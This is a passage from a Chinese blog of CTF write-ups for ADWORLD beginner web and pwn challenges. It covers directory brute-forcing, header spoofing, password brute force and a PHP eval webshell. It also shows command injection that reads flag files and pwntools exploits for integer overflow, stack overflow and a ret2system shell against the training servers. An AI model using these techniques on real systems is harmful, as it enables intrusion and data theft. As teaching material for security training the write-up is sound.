0AAAAAAACICQS6AAAAAAAAEBMIdAEAAAAAACAmEOgCAAAAAABATCDQBQAAAAAAgJhAoAsAAAAAAAAxgUAXAAAAAAAAYgKBLgAAAAAAAMQEAl0AAAAAAACICQS6AAAAAAAAEBMIdAEAAAAAACAmEOgCAAAAAABATCDQBQAAAAAAgJhAoAsAAAAAAAAxgUAXAAAAAAAAYgKBLgAAAAAAAMSE/w/IwhGyqmyBpQAAAABJRU5ErkJggg==" alt="alt"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564381171925.png" alt="1564381171925"></p>
<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>http的数据请求post和get原理</p>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>Firefox、HackBar</p>
<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>在Firefox浏览器中打开网页，提示要用GET方式提交一个值为1的变量a</p>
</li>
<li><p>使用HackBar通过get方式提交变量a=1,或者直接在URL输入框中输入<code>http://111.198.29.45:40308?a=1</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564388248797.png" alt="1564388248797"></p>
</li>
<li><p>根据提示继续以GET的方式提交a=1并以POST的方式提交值为2的变量b（勾选Post data即可）,返回flag为<code>cyberpeace{e0619fdbb17fe505fcded7b3869b9495}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564388398442.png" alt="1564388398442"></p>
</li>
</ol>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>robots.txt文件是一个协议，是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p>目录爆破工具<a href="https://github.com/evilsocket/dirsearch">dirserach</a></p>
<h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>查看源码，没有提示，根据提示robots协议，想到flag可能会存储在<code>robots.txt</code>上</li>
<li>通过目录爆破工具<a href="https://github.com/evilsocket/dirsearch">dirserach</a>扫描网站目录：<code>python3 dirsearch.py -u "http://111.198.29.45:55654/" -e *</code>，扫描到robots.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409074044.png" alt="1564409074044"></li>
<li>访问<code>http://111.198.29.45:55654/robots.txt</code>，发现<code>Disallow: f1ag_1s_h3re.php</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409225599.png" alt="1564409225599"></li>
<li>继续在URL中输入<code>http://111.198.29.45:55654/f1ag_1s_h3re.php</code>，尝试访问<code>f1ag_1s_h3re.php</code>，结果得到flag为<code>cyberpeace{841741b0c0780a80f91f6cd1148d0373}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409361854.png" alt="1564409361854"></li>
</ol>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>常见的备份文件后缀名有: <code>.git</code> <code>.svn</code> <code>.swp</code> <code>.svn</code> <code>.~</code> <code>.bak</code> <code>.bash_history</code></p>
<h3 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h3><p>目录爆破工具<a href="https://github.com/evilsocket/dirsearch">dirserach</a>，<a href="https://notepad-plus-plus.org/">notepad++</a></p>
<h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>查看源码，没有提示，根据提示忘记删除备份文件提示，想到flag可能会存储在备份文件上。</li>
<li>通过目录爆破工具<a href="https://github.com/evilsocket/dirsearch">dirserach</a>扫描网站目录：<code>python3 dirsearch.py -u "http://111.198.29.45:37766/" -e *</code>，扫描到index.php.bak备份文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564632397780.png" alt="1564632397780"></li>
<li>继续在URL中输入<code>http://111.198.29.45:37766/index.php.bak</code>，讲备份文件保存到本地后使用<a href="https://notepad-plus-plus.org/">notepad++</a>打开，发现flag为<code>cyberpeace{899ad51ca546f7e97b7f3f8f02d4e180}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564632691681.png" alt="1564632691681"></li>
</ol>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p>
<h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p>
<h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>使用Firefox打开网页，按下F12，跳转到开发者模式，刷新后，在存储一栏，可看到名为<code>look-here</code>的cookie的值为<code>cookie.php</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564665090877.png" alt="1564665090877"></li>
<li>访问<code>http://111.198.29.45:42848/cookie.php</code>，提示查看http响应包，在网络一栏，看到访问cookie.php的数据包，点击查看数据包，在消息头内发现flag为<code>cyberpeace{06ebc2f1032b90f947762c560d358194}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564665238648.png" alt="1564665238648"></li>
</ol>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled button"></a>disabled button</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>前端HTML语言语法</p>
<h3 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h3><p>Firefox，HackBar</p>
<h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>使用Firefox打开网页，按下F12，跳转到开发者模式，在查看器窗口审查元素，发现按钮请求使用POST方式，<code>name="auth"</code>，<code>value="flag"</code>，<code>disabled=“”</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564666215195.png" alt="1564666215195"></p>
</li>
<li><p>直接删除<code>disabled=“”</code>，或者将<code>disabled</code>改为<code>enabled</code>，使按钮变为可点击，点击按钮即获得flag；或者使用HackBar发送<code>auth=flag</code>的POST请求，也可获得flag为<code>cyberpeace{7fe886060fa0b82db931af33971587bd}</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564666694309.png" alt="1564666694309"></p>
</li>
</ol>
<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple js"></a>simple js</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>javascript的代码审计</p>
<h3 id="工具-6"><a href="#工具-6" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p>
<h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>使用Firefox打开网页，按下F12，跳转到开发者模式，点击查看器查看源代码，可以发现js代码</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564667544538.png" alt="1564667544538"></p>
<ol start="2">
<li><p>进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 <code>fromCharCode</code>中 。</p>
</li>
<li><p>使用python处理字符串，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="built_in">print</span> (s)</span><br></pre></td></tr></table></figure></li>
<li><p>将数字转换成ASCII码得到字符串<code>786OsErtk12</code>，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">b = <span class="built_in">chr</span>(i)</span><br><span class="line">c = c + b</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></li>
<li><p>根据flag格式提示，得到flag为<code>Cyberpeace{786OsErtk12}</code> 。</p>
</li>
</ol>
<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff referer"></a>xff referer</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p>
<h3 id="工具-7"><a href="#工具-7" class="headerlink" title="工具"></a>工具</h3><p>Firefox，burpsuite</p>
<h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>使用Firefox打开网页，提示IP地址必须为<code>123.123.123.123</code>。</p>
</li>
<li><p>使用burpsuite对Firefox进行代理拦截，在请求头添加<code>X-Forwarded-For: 123.123.123.123</code>，然后放行。收到包显示必须来自<code>https://www.google.com</code>：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564670056246.png" alt="1564670056246"></p>
</li>
<li><p>继续在请求头添加<code>Referer: https://www.google.com</code>，放行后获得flag为<code>cyberpeace{0dd83e102ef7baaee4b1332a71de72e5}</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564670223392.png" alt="1564670223392"></p>
</li>
</ol>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak auth"></a>weak auth</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>弱口令爆破</p>
<h3 id="工具-8"><a href="#工具-8" class="headerlink" title="工具"></a>工具</h3><p>burpsuite、攻击字典</p>
<h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>使用Firefox打开网页，尝试输入任意用户名，提示要使用admin账户登录。</li>
<li>用burpsuite截下登录的数据包。</li>
<li><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564671594599.png" alt="1564671594599"></li>
<li>把数据包发送到intruder爆破，设置爆破点为password。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564671901275.png" alt="1564671901275"></li>
<li>导入攻击字典。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564672033296.png" alt="1564672033296"></li>
<li>开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样。查看响应包，找到flag为<code>cyberpeace{22ee862a8aabe56a849198cd2bd9d2a8}</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564672188609.png" alt="1564672188609"></li>
</ol>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>php一句话木马</p>
<h3 id="工具-9"><a href="#工具-9" class="headerlink" title="工具"></a>工具</h3><p>菜刀</p>
<h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>打开网页，发现提示<code>&lt;?php @eval($_POST['shell']);?&gt;</code> ，为PHP一句话木马。</li>
<li>使用菜刀连接：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710201148.png" alt="1564710201148"></li>
<li>网站目录下发现了f<code>lag.txt</code>文件：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710259022.png" alt="1564710259022"></li>
<li>查看文件可获得flag为<code>cyberpeace{8733882b6647dada96f18da7f7f56754}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710354117.png" alt="1564710354117"></li>
</ol>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p>windows和linux下:<br><code>command1 &amp;&amp; command2</code> 先执行<code>command1</code>后执行<code>command2</code><br><code>command1 | command2</code> 只执行<code>command2</code><br><code>command1 &amp; command2</code> 先执行<code>command2</code>后执行<code>command1</code></p>
<h3 id="工具-10"><a href="#工具-10" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p>
<h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>使用Firefox打开网页，在输入框输入<code>ping 111.198.29.45 | find / -name "flag.txt"</code>，寻找flag位置为<code>/home/flag.txt</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564711345518.png" alt="1564711345518"></li>
<li>继续输入命令<code>ping 111.198.29.45 | cat /home/flag.txt</code>打开flag.txt文件,获得flag为<code>cyberpeace{807ae4792ee2474774421999b765b97e}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564711560625.png" alt="1564711560625"></li>
</ol>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><h3 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h3><p>PHP比较符号<code>===</code>和<code>==</code></p>
<p><code>===</code>会先比较字符串的类型再比较字符串的值</p>
<p><code>==</code>会先将字符串换成相同类型，再作比较，属于弱类型比较</p>
<h3 id="工具-11"><a href="#工具-11" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p>
<h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>使用Firefox 打开网页，发现PHP代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">	<span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line">	<span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>){</span><br><span class="line">	    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>)){</span><br><span class="line">	    <span class="keyword">exit</span>();</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>){</span><br><span class="line">	    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">	}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>进行代码审计：通过<code>GET</code>方式传值<code>a</code>和<code>b</code>，需要满足<code>$a==0 &amp;&amp; $a</code>且b不为数字或数字字符串且<code>$b&gt;1234</code>。</p>
</li>
<li><p>在URL输入栏中输入<code>http://111.198.29.45:31491/index.php?a=a&amp;&amp;b=1235b</code>，满足审计条件，获得flag为<br><code>Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564713453391.png" alt="1564713453391"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWORLD PWN 新手练习区 WP</title>
    <url>/ADWORLD-PWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理adworld的PWN题新手练习区WriteUp；<span id="more"></span></p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>整数溢出！</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105150511.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151002.png" style="zoom:50%;"></li>
<li><p>login()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151826.png" style="zoom:50%;"></li>
<li><p>check_passwd()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105151905.png" style="zoom:50%;"></li>
<li><p>what_is_this()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105152246.png" style="zoom:50%;">

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105154215.png" style="zoom:50%;"></li>
<li><p>分析：</p>
<p> main()选择是否登录，login()输入username和passwd，check_passwd()判断密码，注入点在check_passwd()中，分析如下：</p>
<ol>
<li> v3为密码长度，要求<code>3&lt;v3&lt;=8</code></li>
<li> 将密码s复制给dest，其中s的不超过<code>0x199</code>字节，dest距离ebp有<code>0x14</code>字节；</li>
<li> v3位 unsigned_int8类型，最大只能255，passwd长度在259-263之间即可绕过；</li>
<li> 可以通过覆盖v3、dest、ebp实现执行what_is_this()函数；</li>
</ol>
</li>
<li><p>构造payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="string">"54323"</span>)</span><br><span class="line"><span class="comment"># p = process('./int_overflow')</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'leeyuxun'</span>)</span><br><span class="line">what_is_this = p32(<span class="number">0x804868B</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + what_is_this</span><br><span class="line">payload = payload.ljust(<span class="number">259</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'passwd:'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，溢出成功，拿到flag如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210105155028.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<h2 id="Hello-pwn"><a href="#Hello-pwn" class="headerlink" title="Hello_pwn"></a>Hello_pwn</h2><p>栈溢出</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173119.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173223.png" style="zoom:50%;"></li>
<li><p>sub_400686()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173331.png" style="zoom:50%;"></li>
<li><p>分析：</p>
<ol>
<li> 读取16字节输入到unk_601068；</li>
<li> 判断dword_60106C是否等于1853186401；</li>
<li> 如果等于就执行sub_400686()函数；</li>
<li> unk_601068与dword_60106C相差4字节；</li>
<li> 只需将dword_60106C起填充为1853186401即可；</li>
</ol>
</li>
<li><p>构造payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>,<span class="string">"40723"</span>)</span><br><span class="line"><span class="comment"># p = process('./hello_pwn')</span></span><br><span class="line">dword_60106C = p64(<span class="number">1853186401</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + dword_60106C</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，溢出成功，拿到flag如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210111173934.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>修改system函数参数的栈溢出！</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182836.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182915.png" style="zoom:50%;"></li>
<li><p>hello()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112182955.png" style="zoom:50%;"></li>
<li><p>pwn()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112183058.png" style="zoom:50%;"></li>
</ol>
</li>
<li><p>分析</p>
<ol>
<li><p> main()定义三个流的缓冲区，然后调用hello()；</p>
</li>
<li><p> hello()前部分可以不看，后三行，首先通过fgets()输入name，其次输入message，这里gets()函数存在缓冲区溢出漏洞；</p>
</li>
<li><p> pwn()函数调用了system，但是并未出现<code>/bin/sh</code>或者是<code>cat flag</code>；</p>
</li>
<li><p>查看发现name是bss段的一个大小为<code>0x34</code>的区域，s区域的起始位置是运行时距离栈帧<code>0x26</code>个字节的地方，大小不限；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190639.png" style="zoom:50%;">

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112190737.png" style="zoom:50%;"></li>
<li><p> 由于只开启了NX，那么name的地址是不变的，记下name地址<code>0x0808A0880</code>，输入<code>/bin/sh</code>到name里；</p>
</li>
<li><p> 把name作为参数传给system，构成<code>system("/bin/sh")</code></p>
</li>
</ol>
</li>
<li><p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_dir = p32(<span class="number">0x0804A080</span>)</span><br><span class="line">syst_dir = p32(<span class="number">0x08048420</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x26</span> + <span class="string">'A'</span>*<span class="number">0x4</span> + syst_dir + <span class="string">'a'</span>*<span class="number">0x4</span> + name_dir</span><br></pre></td></tr></table></figure>

<p> s距离ebp有<code>0x26</code>，再加上需要覆盖的ebp长度<code>0x4</code>，所以总共需要填充，在加上system地址，再加上任意4位地址填充和name地址，最终payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.134'</span>,<span class="string">'58209'</span>)</span><br><span class="line"><span class="comment"># p = process('./cgpwn2')</span></span><br><span class="line">name_dir = p32(<span class="number">0x0804A080</span>)</span><br><span class="line">syst_dir = p32(<span class="number">0x08048420</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x26</span> + <span class="string">'a'</span>*<span class="number">0x4</span> + syst_dir + <span class="string">'a'</span>*<span class="number">0x4</span> + name_dir</span><br><span class="line">p.recvline(<span class="string">'please tell me your name/n'</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvline(<span class="string">'hello,you can leave some message here:/n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，溢出成功，拿到flag如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210112191546.png" style="zoom:50%;"></li>
</ol>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>？？？</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175210.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175253.png" style="zoom:50%;">

<p> ？？？？？被安排滴明明白白！！！</p>
</li>
<li><p>直接payload；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.134'</span>,<span class="string">'32274'</span>)</span><br><span class="line"><span class="comment"># p = process('./get_shell')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行查看flag，（不写payload，直接nc连接更快）；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210113175639.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>格式化字符串漏洞！</p>
<ol>
<li><p>checksec查看，开启RELOR、NX和栈保护；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127181940.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127182146.png" style="zoom:50%;"></li>
</ol>
</li>
<li><p>分析</p>
<ol>
<li><p> 只需将pwnme的之设为8即可实现<code>cat flag</code>；</p>
</li>
<li><p> 程序中没有给pwnme赋值的操作；</p>
</li>
<li><p>程序中<code>printf(&amp;s)</code>存在格式化字符串漏洞：</p>
<ol>
<li><p>漏洞介绍：</p>
<ol>
<li><p> 一般<code>printf()</code>函数格式为<code>printf("格式化字符串",参数...)</code>，参数由格式化说明符与字符串组成的，通过格式化说明符来规定参数用什么格式输出内容；</p>
</li>
<li><p>格式化说明符有如下几种：</p>
<ol>
<li> <code>%d</code>：输出十进制整数 </li>
<li> <code>%s</code>：从内存中输出字符串 </li>
<li> <code>%x</code>：输出十六进制数 </li>
<li> <code>%c</code>：输出字符 </li>
<li> <code>%p</code>：输出指针地址 </li>
<li> <strong><code>%n</code>：输出到目前为止所写的字符数</strong></li>
</ol>
</li>
<li><p>此处需要注意的是<code>%n</code>，它的功能是将<code>%n</code>之前打印出来的字符个数，赋值给一个变量，举例如下</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">'hello world%n hello'</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">'a = %d'</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 输出"hello world hello  a = 11"</span></span><br></pre></td></tr></table></figure>

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183343.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
</li>
<li><p> 由此利用该漏洞给pwnme赋值；</p>
</li>
<li><p>查看pwnme的地址为<code>0x0804A068</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183550.png" style="zoom:50%;"></li>
<li><p>如何利用：</p>
<ol>
<li> 将pwnme的地址输入到message；</li>
<li> 在合适的位置上加一个<code>%n</code>，使其与输入的地址对应从而造成漏洞利用；</li>
</ol>
</li>
<li><p>查看栈偏移：</p>
<ol>
